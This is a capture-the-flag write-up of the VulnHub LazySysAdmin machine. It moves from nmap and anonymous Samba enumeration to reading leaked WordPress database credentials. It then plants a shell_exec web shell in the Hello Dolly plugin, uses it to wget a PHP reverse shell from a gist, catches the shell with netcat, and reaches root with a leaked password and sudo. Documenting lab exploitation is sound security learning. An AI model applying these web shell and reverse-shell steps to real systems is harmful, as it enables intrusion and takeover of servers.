---
title:  "VulnHub LazySysAdmin Writeup"
date:   2017-10-14 00:00:00
description: A Quick Friday Night Exercise
---

This is a writeup for VulnHub's [LazySysAdmin: 1](https://www.vulnhub.com/entry/lazysysadmin-1,205/) challenge. It's almost a year since I did my last VulnHub challenge, [HackDay: Albania](https://www.vulnhub.com/entry/hackday-albania,167/).

### Host Discovery

I started by scanning my network in the range of IP addresses usually assigned by the DHCP server to new hosts. The VM is assigned the address 192.168.0.107.

```
$ nmap 192.168.0.100-120

Nmap scan report for 192.168.0.107
Host is up (0.00017s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3306/tcp open  mysql
6667/tcp open  irc
```

As we can see, the host is running several network services. We'll start by checking the HTTP service.

### HTTP Service

We're served a web page that looks like of some startup whose founder isn't very passionate to run the company.

![iDontCare](/assets/images/posts/lazysysadmin-idontcare.png)

It has a `robots.txt` file.

```
User-agent: *
Disallow: /old/
Disallow: /test/
Disallow: /TR2/
Disallow: /Backnode_files/
```

Only `/Backnode_files/` has some files inside, and it doesn't seem to have anything useful.

### Moar Service Discovery

On our previous Nmap run we saw that the hsost is listening on several ports. We're going to see what services are running.

```
$ nmap 192.168.0.107 -A

Starting Nmap 7.01 ( https://nmap.org ) at 2017-10-13 22:24 WIB
Nmap scan report for 192.168.0.107
Host is up (0.0016s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 b5:38:66:0f:a1:ee:cd:41:69:3b:82:cf:ad:a1:f7:13 (DSA)
|   2048 58:5a:63:69:d0:da:dd:51:cc:c1:6e:00:fd:7e:61:d0 (RSA)
|_  256 61:30:f3:55:1a:0d:de:c8:6a:59:5b:c9:9c:b4:92:04 (ECDSA)
80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-generator: Silex v2.2.7
| http-robots.txt: 4 disallowed entries 
|_/old/ /test/ /TR2/ /Backnode_files/
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Backnode
139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: LAZYSYSADMIN)
445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: LAZYSYSADMIN)
3306/tcp open  mysql       MySQL (unauthorized)
6667/tcp open  irc         InspIRCd
| irc-info: 
|   server: Admin.local
|   users: 1
|   servers: 1
|   chans: 0
|   lusers: 1
|   lservers: 0
|   source ident: nmap
|   source host: 192.168.0.105
|_  error: Closing link: (nmap@192.168.0.105) [Client exited]
Service Info: Host: Admin.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: LAZYSYSADMIN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: lazysysadmin
|   NetBIOS computer name: LAZYSYSADMIN
|   Domain name: 
|   FQDN: lazysysadmin
|_  System time: 2017-10-14T01:25:10+10:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server supports SMBv2 protocol

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.60 seconds
```

It's running Samba for file sharing. Nice.

### Samba Dancing

Let's see if we can get anything out of the Samba service.

```
$ smbclient -L 192.168.0.107 -N
WARNING: The "syslog" option is deprecated
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.11-Ubuntu]

  Sharename       Type      Comment
  ---------       ----      -------
  print$          Disk      Printer Drivers
  share$          Disk      Sumshare
  IPC$            IPC       IPC Service (Web server)
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.11-Ubuntu]

  Server               Comment
  ---------            -------
  LAZYSYSADMIN         Web server

  Workgroup            Master
  ---------            -------
  WORKGROUP            LAZYSYSADMIN
```

See the sharenames. We can't connect using `print$` and `IPC$` doesn't allow us to list files after connecting. But `share$` looks good.

```
$ smbclient //192.168.0.107/share$ -N
WARNING: The "syslog" option is deprecated
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.11-Ubuntu]
smb: \> ls
  .                                   D        0  Tue Aug 15 18:05:52 2017
  ..                                  D        0  Mon Aug 14 19:34:47 2017
  wordpress                           D        0  Tue Aug 15 18:21:08 2017
  Backnode_files                      D        0  Mon Aug 14 19:08:26 2017
  wp                                  D        0  Tue Aug 15 17:51:23 2017
  deets.txt                           N      139  Mon Aug 14 19:20:05 2017
  robots.txt                          N       92  Mon Aug 14 19:36:14 2017
  todolist.txt                        N       79  Mon Aug 14 19:39:56 2017
  apache                              D        0  Mon Aug 14 19:35:19 2017
  index.html                          N    36072  Sun Aug  6 12:02:15 2017
  info.php                            N       20  Tue Aug 15 17:55:19 2017
  test                                D        0  Mon Aug 14 19:35:10 2017
  old                                 D        0  Mon Aug 14 19:35:13 2017

    3029776 blocks of size 1024. 1457080 blocks available
smb: \>
```

We can see that it has WordPress running. After some check, the WordPress is run at `/wordpress/` path instead of `/wp/`, since `/wp/` is an empty directory.

We can also see that the host is running on Apache.

```
$ curl -X HEAD http://192.168.0.107 -v
Warning: Setting custom HTTP method to HEAD with -X/--request may not work the 
Warning: way you want. Consider using -I/--head instead.
* Rebuilt URL to: http://192.168.0.107/
*   Trying 192.168.0.107...
* Connected to 192.168.0.107 (192.168.0.107) port 80 (#0)
> HEAD / HTTP/1.1
> Host: 192.168.0.107
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Fri, 13 Oct 2017 15:38:28 GMT
< Server: Apache/2.4.7 (Ubuntu)
< Last-Modified: Sun, 06 Aug 2017 05:02:15 GMT
< ETag: "8ce8-5560ea23d23c0"
< Accept-Ranges: bytes
< Content-Length: 36072
< Vary: Accept-Encoding
< Content-Type: text/html
< 
* transfer closed with 36072 bytes remaining to read
* Closing connection 0
curl: (18) transfer closed with 36072 bytes remaining to read
```

### WordPress Loves Dolly

I proceed to check out the WordPress page.

![Sad WordPress Page](/assets/images/posts/lazysysadmin-wordpress.png)

Its admin page is available here.

```
http://192.168.0.107/wp-admin/
```

It's not left vulnerable to SQL injection, so we need to find another way around.

On the Samba console, there's a `wp-config.php` file inside the `/wordpress/` directory. I downloaded it and see it has the following lines.

```
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'Admin');

/** MySQL database password */
define('DB_PASSWORD', 'TogieMYSQL12345^^');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');
```

The `DB_USER` and `DB_PASSWORD` can be used to login to the WordPress admin panel.

![Hello Dolly](/assets/images/posts/lazysysadmin-wp-admin.png)

See the text around the top right of the page?

```
So, take her wrap, fellas
```

It's a line from Louis Armstrong's song _Hello Dolly_. It's printed by a WordPress plugin called Hello Dolly.

### Dolly'll Never Gonna Give You Up

I went to the plugins page and edit the Hello Dolly plugin's `hello_dolly_get_lyric()` function to something like this.

```
function hello_dolly_get_lyric() {
  /** These are the lyrics to Hello Dolly */
  $lyrics = "Hello, Dolly
Well, hello, Dolly
It's so nice to have you back where you belong
You're lookin' swell, Dolly
I can tell, Dolly
You're still glowin', you're still crowin'
You're still goin' strong
We feel the room swayin'
While the band's playin'
One of your old favourite songs from way back when
So, take her wrap, fellas
Find her an empty lap, fellas
Dolly'll never go away again
Hello, Dolly
Well, hello, Dolly
It's so nice to have you back where you belong
You're lookin' swell, Dolly
I can tell, Dolly
You're still glowin', you're still crowin'
You're still goin' strong
We feel the room swayin'
While the band's playin'
One of your old favourite songs from way back when
Golly, gee, fellas
Find her a vacant knee, fellas
Dolly'll never go away
Dolly'll never go away
Dolly'll never go away again";

  // Here we split it into lines
  $lyrics = explode( "\n", $lyrics );

  // And then randomly choose a line
  //return wptexturize( $lyrics[ mt_rand( 0, count( $lyrics ) - 1 ) ] );
  $lyrics = "<pre>".shell_exec($_GET['cmd'])."</pre>";
  return  wptexturize($lyrics);
}
```

I commented the return instruction, add a line to execute shell command, and return the shell command result to be printed in place of the previous _Hello Dolly_ song lyrics.

![Aww Yeah](/assets/images/posts/lazysysadmin-wp-rce.png)

### PHP Reverse Shell

I uploaded PHP reverse shell script for me to gain reverse shell access at GitHub using anonymous Gist feature.

```
https://gist.githubusercontent.com/anonymous/5cf1bb6324abcc8041c4f9e28d5f8424/raw/94a5905fca7a8a21ef4cda2cdc13e6511c7a2856/php-reverse-shell.php
```

Then, I had the Hello Dolly plugin downloaded it using `wget` by hitting this URL on my browser.

```
http://192.168.0.107/wordpress/wp-admin/index.php?cmd=wget+https%3A%2F%2Fgist.githubusercontent.com%2Fanonymous%2F5cf1bb6324abcc8041c4f9e28d5f8424%2Fraw%2F94a5905fca7a8a21ef4cda2cdc13e6511c7a2856%2Fphp-reverse-shell.php
```

Sweet. Now I set up `netcat` to listen to port 1234, the port my PHP reverse shell is connecting to.

```
$ nc -lnvp 1234
```

I accessed PHP reverse shell from my browser.

```
http://192.168.0.107/wordpress/wp-admin/php-reverse-shell.php
```

Now I got the reverse shell with the user privilege of www-data.

```
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

I might have the reverse shell, but not a proper TTY yet. So I need to run this command from the reverse shell.

```
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Exploring the Shell

At first, I tried connecting to MySQL locally since I couldn't connect to MySQL from remote host. But I didn't find anything useful there.

I tried to find exploitable SUID files, but there doesn't seem to be any that's exploitable.

```
$ find / -perm -4000 -type f 2>/dev/null
/bin/ping
/bin/fusermount
/bin/ping6
/bin/umount
/bin/mount
/bin/su
/usr/bin/traceroute6.iputils
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/at
/usr/bin/mtr
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/chfn
/usr/sbin/uuidd
/usr/sbin/pppd
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
```

There's a user with the name togie in the system.

```
$ ls -alh /home
total 12K
drwxr-xr-x  3 root  root  4.0K Aug 14 20:00 .
drwxr-xr-x 22 root  root  4.0K Aug 21 20:10 ..
drwxr-xr-x  3 togie togie 4.0K Aug 15 23:05 togie
```

The `/etc/passwd/` file is not writable and the `/etc/shadow` can't be read. I also don't seem to be able to register new cron jobs using www-data user.

www-data is not a sudoer, but togie is.

```
$ for i in $(cat /etc/passwd 2>/dev/null| cut -d":" -f1 2>/dev/null);do id $i;done 2>/dev/null
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=100(libuuid) gid=101(libuuid) groups=101(libuuid)
uid=101(syslog) gid=104(syslog) groups=104(syslog),4(adm)
uid=102(messagebus) gid=106(messagebus) groups=106(messagebus)
uid=103(landscape) gid=109(landscape) groups=109(landscape)
uid=1000(togie) gid=1000(togie) groups=1000(togie),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare)
uid=104(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=105(mysql) gid=113(mysql) groups=113(mysql)
```

Using `netstat`, we can see that Nmap already identified all of the listening services.

```
$ netstat -tunlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:6667            0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::139                  :::*                    LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
tcp6       0      0 :::445                  :::*                    LISTEN      -               
udp        0      0 192.168.0.255:137       0.0.0.0:*                           -               
udp        0      0 192.168.0.107:137       0.0.0.0:*                           -               
udp        0      0 0.0.0.0:137             0.0.0.0:*                           -               
udp        0      0 192.168.0.255:138       0.0.0.0:*                           -               
udp        0      0 192.168.0.107:138       0.0.0.0:*                           -               
udp        0      0 0.0.0.0:138             0.0.0.0:*                           -               
udp        0      0 0.0.0.0:32228           0.0.0.0:*                           -               
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
udp        0      0 0.0.0.0:44636           0.0.0.0:*                           -               
udp6       0      0 :::27536                :::*                                -
```

So I checked the files in `/var/www/html` directory to see if there's anything useful. `deets.txt` seems to contain something really sensitive there.

```
$ cat deets.txt
CBF Remembering all these passwords.

Remember to remove this file and update your password after we push out the server.

Password 12345


```

It's togie's password. Nice!

### I am togie

togie is a sudoer, so we can do this.

```
$ sudo su
```

And perform this.

```
# cd /root
# ls -alh
total 28K
drwx------  3 root root 4.0K Aug 15 23:10 .
drwxr-xr-x 22 root root 4.0K Aug 21 20:10 ..
-rw-------  1 root root 1000 Aug 21 20:10 .bash_history
-rw-r--r--  1 root root 3.1K Feb 20  2014 .bashrc
drwx------  2 root root 4.0K Aug 14 20:30 .cache
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
-rw-r--r--  1 root root  347 Aug 21 19:35 proof.txt
# cat proof.txt
WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851


Well done :)

Hope you learn't a few things along the way.

Regards,

Togie Mcdogie




Enjoy some random strings

WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851
2d2v#X6x9%D6!DDf4xC1ds6YdOEjug3otDmc1$#slTET7
pf%&1nRpaj^68ZeV2St9GkdoDkj48Fl$MI97Zt2nebt02
bhO!5Je65B6Z0bhZhQ3W64wL65wonnQ$@yw%Zhy0U19pu
```

Actually, we can also use SSH with togie's account after we got the password. Choose whatever way suits you.

That's it! Thanks for the challenge, [Togie Mcdogie](https://www.vulnhub.com/author/togie-mcdogie,561/)!